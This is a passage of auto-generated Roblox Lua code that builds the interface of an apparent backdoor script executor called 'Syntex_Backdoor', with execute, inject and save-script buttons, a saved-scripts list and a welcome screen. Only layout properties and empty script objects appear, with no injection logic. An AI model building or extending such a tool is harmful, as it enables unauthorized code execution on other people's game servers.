-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName.TextBox.UICorner
G2L["4d"] = Instance.new("UICorner", G2L["4c"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName.TextBox.UIStroke
G2L["4e"] = Instance.new("UIStroke", G2L["4c"]);
G2L["4e"]["Transparency"] = 0.5;
G2L["4e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4e"]["Thickness"] = 2;
G2L["4e"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName.saveButton
G2L["4f"] = Instance.new("TextButton", G2L["48"]);
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["TextSize"] = 21;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["4f"]["Size"] = UDim2.new(0, 161, 0, 26);
G2L["4f"]["Name"] = [[saveButton]];
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Text"] = [[Save Script]];
G2L["4f"]["Position"] = UDim2.new(0.22958, 0, 0.74577, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName.saveButton.UICorner
G2L["50"] = Instance.new("UICorner", G2L["4f"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.scriptName.saveButton.UIStroke
G2L["51"] = Instance.new("UIStroke", G2L["4f"]);
G2L["51"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["51"]["Thickness"] = 2;
G2L["51"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.saveScriptFrame.lunarThemeGradient
G2L["52"] = Instance.new("UIGradient", G2L["45"]);
G2L["52"]["Rotation"] = 132;
G2L["52"]["Name"] = [[lunarThemeGradient]];
G2L["52"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons
G2L["53"] = Instance.new("Frame", G2L["2e"]);
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["53"]["Size"] = UDim2.new(0, 374, 0, 40);
G2L["53"]["Position"] = UDim2.new(0.04297, 0, 0.82456, 0);
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["Name"] = [[buttons]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.UICorner
G2L["54"] = Instance.new("UICorner", G2L["53"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.erase
G2L["55"] = Instance.new("ImageButton", G2L["53"]);
G2L["55"]["BorderSizePixel"] = 0;
G2L["55"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["Image"] = [[rbxassetid://121016277461554]];
G2L["55"]["TileSize"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["55"]["Size"] = UDim2.new(0, 37, 0, 28);
G2L["55"]["BackgroundTransparency"] = 1;
G2L["55"]["HoverImage"] = [[rbxassetid://121016277461554]];
G2L["55"]["Name"] = [[erase]];
G2L["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Position"] = UDim2.new(0.15152, 0, 0.15497, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.erase.LocalScript
G2L["56"] = Instance.new("LocalScript", G2L["55"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.execute
G2L["57"] = Instance.new("ImageButton", G2L["53"]);
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["57"]["Image"] = [[rbxassetid://134072189046076]];
G2L["57"]["TileSize"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["57"]["Size"] = UDim2.new(0, 31, 0, 30);
G2L["57"]["BackgroundTransparency"] = 1;
G2L["57"]["HoverImage"] = [[rbxassetid://100706145441699]];
G2L["57"]["Name"] = [[execute]];
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Position"] = UDim2.new(0.04042, 0, 0.15586, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.execute.LocalScript
G2L["58"] = Instance.new("LocalScript", G2L["57"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.hide
G2L["59"] = Instance.new("ImageButton", G2L["53"]);
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["59"]["ImageColor3"] = Color3.fromRGB(239, 239, 239);
G2L["59"]["Image"] = [[rbxassetid://94012694340315]];
G2L["59"]["TileSize"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["59"]["Size"] = UDim2.new(0, 37, 0, 27);
G2L["59"]["BackgroundTransparency"] = 1;
G2L["59"]["HoverImage"] = [[rbxassetid://94012694340315]];
G2L["59"]["Name"] = [[hide]];
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Position"] = UDim2.new(0.54308, 0, 0.15586, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.hide.LocalScript
G2L["5a"] = Instance.new("LocalScript", G2L["59"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.hide.ImageLabel
G2L["5b"] = Instance.new("ImageLabel", G2L["59"]);
G2L["5b"]["BorderSizePixel"] = 0;
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["Image"] = [[rbxassetid://123768708651808]];
G2L["5b"]["Size"] = UDim2.new(0, 433, 0, 204);
G2L["5b"]["Visible"] = false;
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["Position"] = UDim2.new(-4.2203, 0, -8.40165, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.hide.ImageLabel.Frame
G2L["5c"] = Instance.new("Frame", G2L["5b"]);
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["Size"] = UDim2.new(0, 94, 0, 26);
G2L["5c"]["Position"] = UDim2.new(0.76959, 0, 0.86374, 0);
G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.hide.ImageLabel.UICorner
G2L["5d"] = Instance.new("UICorner", G2L["5b"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.inject
G2L["5e"] = Instance.new("ImageButton", G2L["53"]);
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["5e"]["Image"] = [[rbxassetid://115563288273504]];
G2L["5e"]["TileSize"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["5e"]["Size"] = UDim2.new(0, 37, 0, 29);
G2L["5e"]["BackgroundTransparency"] = 1;
G2L["5e"]["HoverImage"] = [[rbxassetid://115563288273504]];
G2L["5e"]["Name"] = [[inject]];
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Position"] = UDim2.new(0.85383, 0, 0.12997, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.inject.LocalScript
G2L["5f"] = Instance.new("LocalScript", G2L["5e"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.saveScript
G2L["60"] = Instance.new("ImageButton", G2L["53"]);
G2L["60"]["BorderSizePixel"] = 0;
G2L["60"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["60"]["ImageColor3"] = Color3.fromRGB(192, 192, 192);
G2L["60"]["Image"] = [[rbxassetid://136165653382678]];
G2L["60"]["TileSize"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["60"]["Size"] = UDim2.new(0, 37, 0, 28);
G2L["60"]["BackgroundTransparency"] = 1;
G2L["60"]["HoverImage"] = [[rbxassetid://136165653382678]];
G2L["60"]["Name"] = [[saveScript]];
G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["Position"] = UDim2.new(0.40628, 0, 0.15586, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.saveScript.LocalScript
G2L["61"] = Instance.new("LocalScript", G2L["60"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.saveScript.LocalScript
G2L["62"] = Instance.new("LocalScript", G2L["60"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.saveScript.ImageLabel
G2L["63"] = Instance.new("ImageLabel", G2L["60"]);
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["Image"] = [[rbxassetid://123768708651808]];
G2L["63"]["Size"] = UDim2.new(0, 434, 0, 205);
G2L["63"]["Visible"] = false;
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Position"] = UDim2.new(-4.05405, 0, -6.15016, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.saveScript.ImageLabel.Frame
G2L["64"] = Instance.new("Frame", G2L["63"]);
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["Size"] = UDim2.new(0, 94, 0, 26);
G2L["64"]["Position"] = UDim2.new(0.76959, 0, 0.86374, 0);
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.saveScript.ImageLabel.UICorner
G2L["65"] = Instance.new("UICorner", G2L["63"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.UIStroke
G2L["66"] = Instance.new("UIStroke", G2L["53"]);
G2L["66"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["66"]["Thickness"] = 2;
G2L["66"]["Color"] = Color3.fromRGB(35, 35, 35);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.Frame
G2L["67"] = Instance.new("Frame", G2L["53"]);
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(35, 35, 35);
G2L["67"]["Size"] = UDim2.new(0, 2, 0, 41);
G2L["67"]["Position"] = UDim2.new(0.7946, 0, -0, 0);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.Frame
G2L["68"] = Instance.new("Frame", G2L["53"]);
G2L["68"]["BorderSizePixel"] = 0;
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(35, 35, 35);
G2L["68"]["Size"] = UDim2.new(0, 2, 0, 40);
G2L["68"]["Position"] = UDim2.new(0.26955, 0, -0, 0);
G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.reset
G2L["69"] = Instance.new("ImageButton", G2L["53"]);
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["69"]["Image"] = [[rbxassetid://129091995582201]];
G2L["69"]["TileSize"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["69"]["Size"] = UDim2.new(0, 26, 0, 38);
G2L["69"]["BackgroundTransparency"] = 1;
G2L["69"]["HoverImage"] = [[rbxassetid://129091995582201]];
G2L["69"]["Name"] = [[reset]];
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Position"] = UDim2.new(0.30407, 0, 0.03086, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.ideContainer.buttons.R6
G2L["6a"] = Instance.new("ImageButton", G2L["53"]);
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(45, 45, 45);
G2L["6a"]["Image"] = [[rbxassetid://105666235200467]];
G2L["6a"]["TileSize"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["6a"]["Size"] = UDim2.new(0, 29, 0, 38);
G2L["6a"]["BackgroundTransparency"] = 1;
G2L["6a"]["HoverImage"] = [[rbxassetid://105666235200467]];
G2L["6a"]["Name"] = [[R6]];
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Position"] = UDim2.new(0.68375, 0, 0.03086, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer
G2L["6b"] = Instance.new("Frame", G2L["2d"]);
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["6b"]["Size"] = UDim2.new(0, 192, 0, 286);
G2L["6b"]["Position"] = UDim2.new(0.7303, 0, 0, 0);
G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["Name"] = [[savedScriptsContainer]];
G2L["6b"]["BackgroundTransparency"] = 0.1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer.saveScriptSystem
G2L["6c"] = Instance.new("LocalScript", G2L["6b"]);
G2L["6c"]["Name"] = [[saveScriptSystem]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer.lunarThemeGradient
G2L["6d"] = Instance.new("UIGradient", G2L["6b"]);
G2L["6d"]["Rotation"] = 132;
G2L["6d"]["Name"] = [[lunarThemeGradient]];
G2L["6d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer.lunarThemeGradient.LocalScript
G2L["6e"] = Instance.new("LocalScript", G2L["6d"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer.UIStroke
G2L["6f"] = Instance.new("UIStroke", G2L["6b"]);
G2L["6f"]["Transparency"] = 0.5;
G2L["6f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6f"]["Thickness"] = 2;
G2L["6f"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer.UICorner
G2L["70"] = Instance.new("UICorner", G2L["6b"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer.TextLabel
G2L["71"] = Instance.new("TextLabel", G2L["6b"]);
G2L["71"]["BorderSizePixel"] = 0;
G2L["71"]["TextSize"] = 22;
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
G2L["71"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["BackgroundTransparency"] = 1;
G2L["71"]["Size"] = UDim2.new(0, 146, 0, 36);
G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["Text"] = [[Saved Scripts]];
G2L["71"]["Position"] = UDim2.new(0.11642, 0, 0.04211, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.savedScriptsContainer.ScrollingFrame
G2L["72"] = Instance.new("ScrollingFrame", G2L["6b"]);
G2L["72"]["Active"] = true;
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["Size"] = UDim2.new(0, 192, 0, 237);
G2L["72"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Position"] = UDim2.new(0, 0, 0.17133, 0);
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["BackgroundTransparency"] = 1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC
G2L["73"] = Instance.new("ScrollingFrame", G2L["2d"]);
G2L["73"]["Visible"] = false;
G2L["73"]["Active"] = true;
G2L["73"]["BorderSizePixel"] = 0;
G2L["73"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["73"]["ElasticBehavior"] = Enum.ElasticBehavior.Never;
G2L["73"]["TopImage"] = [[rbxassetid://99314165892296]];
G2L["73"]["MidImage"] = [[rbxassetid://99314165892296]];
G2L["73"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["73"]["Name"] = [[AC]];
G2L["73"]["BottomImage"] = [[rbxassetid://99314165892296]];
G2L["73"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["73"]["Size"] = UDim2.new(0, 279, 0, 82);
G2L["73"]["ScrollBarImageColor3"] = Color3.fromRGB(241, 244, 255);
G2L["73"]["BorderColor3"] = Color3.fromRGB(3, 5, 9);
G2L["73"]["ScrollBarThickness"] = 3;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC.AC_Handler
G2L["74"] = Instance.new("LocalScript", G2L["73"]);
G2L["74"]["Name"] = [[AC_Handler]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC.UIListLayout
G2L["75"] = Instance.new("UIListLayout", G2L["73"]);
G2L["75"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["75"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC.UIStroke
G2L["76"] = Instance.new("UIStroke", G2L["73"]);
G2L["76"]["Thickness"] = 2;
G2L["76"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC.UICorner
G2L["77"] = Instance.new("UICorner", G2L["73"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC.TextButton
G2L["78"] = Instance.new("TextButton", G2L["73"]);
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["AutoButtonColor"] = false;
G2L["78"]["TextSize"] = 14;
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["Size"] = UDim2.new(0, 248, 0, 20);
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Text"] = [[]];
G2L["78"]["Position"] = UDim2.new(0.05376, 0, 0.14634, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC.TextButton.ImageLabel
G2L["79"] = Instance.new("ImageLabel", G2L["78"]);
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["Image"] = [[rbxassetid://1166953370462404]];
G2L["79"]["Size"] = UDim2.new(0, 16, 0, 16);
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["BackgroundTransparency"] = 1;
G2L["79"]["Position"] = UDim2.new(0, 5, 0, 2);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC.TextButton.TextLabel
G2L["7a"] = Instance.new("TextLabel", G2L["78"]);
G2L["7a"]["BorderSizePixel"] = 0;
G2L["7a"]["TextSize"] = 14;
G2L["7a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["BackgroundTransparency"] = 1;
G2L["7a"]["Size"] = UDim2.new(0, 172, 0, 20);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["Position"] = UDim2.new(0.14032, -9, 0, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Executor.AC.TextButton.UICorner
G2L["7b"] = Instance.new("UICorner", G2L["78"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home
G2L["7c"] = Instance.new("Frame", G2L["d"]);
G2L["7c"]["Visible"] = false;
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["7c"]["Size"] = UDim2.new(0, 515, 0, 285);
G2L["7c"]["Position"] = UDim2.new(0.23493, 0, -0.001, 0);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7c"]["Name"] = [[Home]];
G2L["7c"]["BackgroundTransparency"] = 0.1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.userINFO
G2L["7d"] = Instance.new("LocalScript", G2L["7c"]);
G2L["7d"]["Name"] = [[userINFO]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.UICorner
G2L["7e"] = Instance.new("UICorner", G2L["7c"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.UIGradient
G2L["7f"] = Instance.new("UIGradient", G2L["7c"]);
G2L["7f"]["Rotation"] = 132;
G2L["7f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 255, 18))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.UIGradient.LocalScript
G2L["80"] = Instance.new("LocalScript", G2L["7f"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.UIStroke
G2L["81"] = Instance.new("UIStroke", G2L["7c"]);
G2L["81"]["Transparency"] = 0.5;
G2L["81"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["81"]["Thickness"] = 2;
G2L["81"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.wlcmsg
G2L["82"] = Instance.new("TextLabel", G2L["7c"]);
G2L["82"]["TextWrapped"] = true;
G2L["82"]["BorderSizePixel"] = 0;
G2L["82"]["TextSize"] = 24;
G2L["82"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["82"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["82"]["BackgroundTransparency"] = 1;
G2L["82"]["RichText"] = true;
G2L["82"]["Size"] = UDim2.new(0, 357, 0, 33);
G2L["82"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["82"]["Text"] = [[Welcome, (DISPLAY) !]];
G2L["82"]["Name"] = [[wlcmsg]];
G2L["82"]["Position"] = UDim2.new(0.27296, 0, 0.17957, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.ImageLabel
G2L["83"] = Instance.new("ImageLabel", G2L["7c"]);
G2L["83"]["BorderSizePixel"] = 0;
G2L["83"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["83"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["83"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["83"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["83"]["Position"] = UDim2.new(0.04173, 0, 0.06534, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.ImageLabel.UICorner
G2L["84"] = Instance.new("UICorner", G2L["83"]);
G2L["84"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.ImageLabel.UIStroke
G2L["85"] = Instance.new("UIStroke", G2L["83"]);
G2L["85"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["85"]["Thickness"] = 2;
G2L["85"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.galaxyThemeGradient
G2L["86"] = Instance.new("UIGradient", G2L["7c"]);
G2L["86"]["Enabled"] = false;
G2L["86"]["Rotation"] = 132;
G2L["86"]["Name"] = [[galaxyThemeGradient]];
G2L["86"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 18, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.galaxyThemeGradient.LocalScript
G2L["87"] = Instance.new("LocalScript", G2L["86"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lunarThemeGradient
G2L["88"] = Instance.new("UIGradient", G2L["7c"]);
G2L["88"]["Enabled"] = false;
G2L["88"]["Rotation"] = 132;
G2L["88"]["Name"] = [[lunarThemeGradient]];
G2L["88"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))};


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lunarThemeGradient.LocalScript
G2L["89"] = Instance.new("LocalScript", G2L["88"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lilcontainer
G2L["8a"] = Instance.new("Frame", G2L["7c"]);
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["8a"]["Size"] = UDim2.new(0, 195, 0, 140);
G2L["8a"]["Position"] = UDim2.new(0.04078, 0, 0.47108, 0);
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Name"] = [[lilcontainer]];


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lilcontainer.UICorner
G2L["8b"] = Instance.new("UICorner", G2L["8a"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lilcontainer.UIStroke
G2L["8c"] = Instance.new("UIStroke", G2L["8a"]);
G2L["8c"]["Transparency"] = 0.3;
G2L["8c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["8c"]["Thickness"] = 2;
G2L["8c"]["Color"] = Color3.fromRGB(21, 21, 21);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lilcontainer.TextLabel
G2L["8d"] = Instance.new("TextLabel", G2L["8a"]);
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["TextSize"] = 14;
